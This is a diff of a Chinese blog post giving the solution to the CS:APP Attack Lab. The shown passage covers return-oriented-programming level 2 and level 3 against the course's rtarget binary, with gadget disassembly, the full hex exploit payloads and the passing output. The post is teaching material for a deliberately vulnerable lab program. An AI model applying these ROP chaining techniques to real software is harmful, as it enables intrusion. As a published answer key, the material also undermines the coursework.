+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i answer/part2-level2-1 | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">  user id bovik</span><br><span class="line">  course  15213-f15</span><br><span class="line">  lab attacklab</span><br><span class="line">  result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i answer/part2-level2-2 | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">  user id bovik</span><br><span class="line">  course  15213-f15</span><br><span class="line">  lab attacklab</span><br><span class="line">  result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure></li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i answer/part2-level2-3 | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">  user id bovik</span><br><span class="line">  course  15213-f15</span><br><span class="line">  lab attacklab</span><br><span class="line">  result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure></li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i answer/part2-level2-4 | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">  user id bovik</span><br><span class="line">  course  15213-f15</span><br><span class="line">  lab attacklab</span><br><span class="line">  result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>其实就是排列组合两行地址，图我们就不画那么多了，针对最后一种情况画个图，如下所示：</p>
+<div align=center><img src="/img/attack-lab-ph2-level2.jpg" width = 70% height = 70% /></div>
+
+<h3 id="level-3-1"><a href="#level-3-1" class="headerlink" title="level 3"></a>level 3</h3><p>在这一阶段中，我们需要做的就是把字符串的起始地址传送到%rdi，然后调用touch3函数。<br>因为每次栈都是随机的，所以无法直接用地址来索引字符串的位置，只能用栈顶地址+偏移量来索引字符串的起始地址。而从farm中我们可以找到一个<em>gadget</em>来实现两个寄存器值的相加<code>lea (%rdi,%rsi,1),%rax</code>。</p>
+<p>解题思路：</p>
+<ol>
+<li>首先获取%rsp的值，传送到%rdi；</li>
+<li>其次获取字符串的偏移量，传送到%rsi；</li>
+<li>调用<code>lea (%rdi,%rsi,1),%rax</code>，将字符串首地址传送到%rax；</li>
+<li>利用mov指令将%rax传送到%rdi；</li>
+<li>调用touch3函数。</li>
+</ol>
+<p>步骤如下：<br>1 获取%rsp的值：<br>参考表B，在farm中寻找到的符合源操作寄存器为%rsp的只有指令<code>movq %rsp, %rax</code>的指令字节<code>40 89 e0</code>，符合的有下图所示的两种，所以第一步的gadget地址为：0x401a06或者0x401aad。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03: <span class="number">8d</span> <span class="number">87</span> <span class="number">41</span> <span class="number">48</span> <span class="number">89</span> e0     <span class="keyword">lea</span>    -<span class="number">0x1f76b7bf</span>(%rdi),%eax</span><br><span class="line">  401a09: c3                    retq</span><br><span class="line"></span><br><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab: c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> e0 <span class="number">90</span>     movl   <span class="number">$0</span>x90e08948,(%rdi)</span><br><span class="line">  401ab1: c3                    retq</span><br></pre></td></tr></table></figure>
+
+<p>2 将%rax的内容传送到%rdi：<br><code>movq %rax, %rdi</code>的指令字节<code>40 89 c7</code>，符合的有两个，所以第二步的地址为：0x4019a2或者0x4019c5。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0: <span class="number">8d</span> <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3     <span class="keyword">lea</span>    -<span class="number">0x3c3876b8</span>(%rdi),%eax</span><br><span class="line">  4019a6: c3                    retq</span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3: c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 <span class="number">90</span>     movl   <span class="number">$0</span>x90c78948,(%rdi)</span><br><span class="line">  4019c9: c3</span><br></pre></td></tr></table></figure>
+
+<p>3 利用pop指令弹出偏移量：<br>查询表B，只有<code>popq %rax</code>的指令<code>58</code>符合要求，符合的有以下两个，所以第三步的地址为：0x4019ab或者0x4019cc。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7: <span class="number">8d</span> <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>     <span class="keyword">lea</span>    -<span class="number">0x6fa78caf</span>(%rdi),%eax</span><br><span class="line">  4019ad: c3</span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca: b8 <span class="number">29</span> <span class="number">58</span> <span class="number">90</span> c3        <span class="keyword">mov</span>    <span class="number">$0</span>xc3905829,%eax</span><br><span class="line">  4019cf: c3</span><br></pre></td></tr></table></figure>
+
+<p>4 将%rax内容传送到%rsi：<br>查询表B，<code>mov %rax, %rsi</code>指令为<code>48 89 c6</code>，这个在farm中不存在，可以发现，以%rax为源寄存器的movq指令，只有<code>mov %rax, %rdi</code>，但是此时rdi的值已经是栈地址了，所以不能动，那只能打movl的主意了。</p>
+<div align=center>
+  <div style="color:orange;
+    display: inline-block;
+    color: #999;
+    padding: 2px;">表C</div>
+  <br>
+  <img src="/img/movl-gadgets.JPG" width = 100% height = 100% />
+</div>
+
+<p>  1) 如上表所示，在farm中，以%eax为源寄存器的操作码，且不冲击%edi的只有<code>movl %eax, %edx</code>的操作码<code>89 c2</code>了，所以满足这一小步的地址：0x4019dd。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019<span class="built_in">db</span> &lt;getval_481&gt;:</span><br><span class="line">  4019<span class="built_in">db</span>: b8 5c <span class="number">89</span> c2 <span class="number">90</span>        <span class="keyword">mov</span>    <span class="number">$0</span>x90c2895c,%eax</span><br><span class="line">  4019e0: c3</span><br></pre></td></tr></table></figure>
+<p>  2) 不能忘记我们的目标是%rsi/%esi，再查表B和C，以%rdx/%edx为源的操作码只有<code>movl %edx, %ecx</code>的操作码<code>89 d1</code>，符合的地址：0x401a70（这里后面跟着字节91，想必也是无用的字节？）。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a6e &lt;setval_167&gt;:</span><br><span class="line">  401a6e: c7 <span class="number">07</span> <span class="number">89</span> d1 <span class="number">91</span> c3     movl   <span class="number">$0</span>xc391d189,(%rdi)</span><br><span class="line">  401a74: c3</span><br></pre></td></tr></table></figure>
+<p>  3) 再查表B和C，以%rcx/%ecx为源的操作码只有<code>movl %ecx, %esi</code>的操作码<code>89 ce</code>，且目标正是%esi，符合的地址：0x401a13。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11: <span class="number">8d</span> <span class="number">87</span> <span class="number">89</span> ce <span class="number">90</span> <span class="number">90</span>     <span class="keyword">lea</span>    -<span class="number">0x6f6f3177</span>(%rdi),%eax</span><br><span class="line">  401a17: c3</span><br></pre></td></tr></table></figure>
+
+<p>5 调用<code>lea (%rdi,%rsi,1),%rax</code>，将字符串首地址传送到%rax<br>这一步即直接使用以下地址即可：0x4019d6。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6: <span class="number">48</span> <span class="number">8d</span> <span class="number">04</span> <span class="number">37</span>           <span class="keyword">lea</span>    (%rdi,%rsi,<span class="number">1</span>),%rax</span><br><span class="line">  4019da: c3                    retq</span><br></pre></td></tr></table></figure>
+
+<p>6 利用mov指令将%rax传送到%rdi（同步骤2）</p>
+<p>7 计算偏移量<br>执行步骤1时，%rsp所指位置已经指向了步骤2的位置，根据以上分析，从步骤三开始需要指令地址占据栈区的有6个，偏移量占据一行，touch3占据一行，所以中间至少需要隔绝8行（一行64位），然后将字符串首地址放在之上，即偏移量为<code>9 * 8 = 72</code>，所以填写十六进制0x48。</p>
+<p>根据以上分析，我们可以画出一种解法的图如下所示：</p>
+<div align=center><img src="/img/attack-lab-ph2-level3.jpg" width = 70% height = 70% /></div>
+
+<p>所以我们填充的数字如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">70 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+<p>测试结果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i answer/part2-level3 | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">  user id bovik</span><br><span class="line">  course  15213-f15</span><br><span class="line">  lab attacklab</span><br><span class="line">  result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+<p>当然也有其他的一些正确结果，根据以上步骤里的随机组合就好了，这里就不验证了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>真个lab做下来，受益良多，对于栈有了更深的理解，认识到了缓冲区溢出可以造成的严重后果，写出更安全的代码需要注意的点。</p>
+
+      
+
+        
+        
+          <div hidden="hidden"></div>
+        
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p">谢谢你请我吃糖果</i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/wechat.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -209,7 +449,7 @@
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -222,480 +462,123 @@
 	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/03/14/bomb-lab/" class="archive-article-date">
-  	<time datetime="2021-03-14T09:01:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-14</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/03/14/bomb-lab/">Bomb-lab</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">csapp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/csapp//" class="article-tag-list-link color1">csapp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/03/07/Go-wrap%E5%92%8CGC/" class="archive-article-date">
-  	<time datetime="2021-03-07T03:49:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-07</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/03/07/Go-wrap%E5%92%8CGC/">Go-wrap和GC</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Go//" class="article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/03/07/Go-%E9%97%AD%E5%8C%85%E6%97%B6%E7%9A%84for-range/" class="archive-article-date">
-  	<time datetime="2021-03-07T02:00:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-07</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/03/07/Go-%E9%97%AD%E5%8C%85%E6%97%B6%E7%9A%84for-range/">Go-闭包时的for-range</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Go//" class="article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
       
-        </div></section>
+
       
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://iguochan.github.io/2021/04/04/attack-lab/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/12/29/data-lab/" class="archive-article-date">
-  	<time datetime="2020-12-29T13:02:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-29</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/12/29/data-lab/">Data-lab</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">csapp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/csapp//" class="article-tag-list-link color1">csapp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/12/09/Go%E8%AF%AD%E8%A8%80%E6%96%AD%E8%A8%80%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/" class="archive-article-date">
-  	<time datetime="2020-12-09T15:31:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-09</time>
-</a>
 
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2021/03/14/bomb-lab/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Bomb-lab</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/12/09/Go%E8%AF%AD%E8%A8%80%E6%96%AD%E8%A8%80%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">Go语言断言注意事项</a>
-    </h1>
-  
+  <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC81MDU5MS8yNzA3NA==">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
+       if (typeof LivereTower === 'function') { return; }
 
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Go//" class="article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
 
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/12/06/Go-GIN/" class="archive-article-date">
-  	<time datetime="2020-12-06T08:20:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-06</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/12/06/Go-GIN/">Golang微框架Gin</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
